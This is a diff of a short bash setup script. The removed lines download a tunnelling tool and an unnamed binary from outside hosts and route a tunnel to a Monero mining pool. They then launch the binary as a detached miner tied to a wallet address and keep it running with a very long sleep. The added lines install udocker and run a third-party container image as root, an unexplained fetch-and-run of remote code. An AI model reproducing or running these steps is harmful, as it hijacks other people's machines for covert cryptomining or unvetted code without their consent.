@@ -1,11 +1,4 @@
 #!/bin/bash
 sudo apt update
-sudo apt install screen -y
-curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
-tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
-chmod +x wstunnel bos
-nohup ./wstunnel server ws://127.0.0.1:2233 &
-nohup ./wstunnel client -L tcp://127.0.0.1:1122:xmr.kryptex.network:7029 ws://127.0.0.1:2233 &
-screen -dmS play ./bos -o 127.0.0.1:1122 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 7
-sleep 34674653455
+sudo apt install python3-pip -y
+pip install udocker;udocker --allow-root run lagraven/node:latest
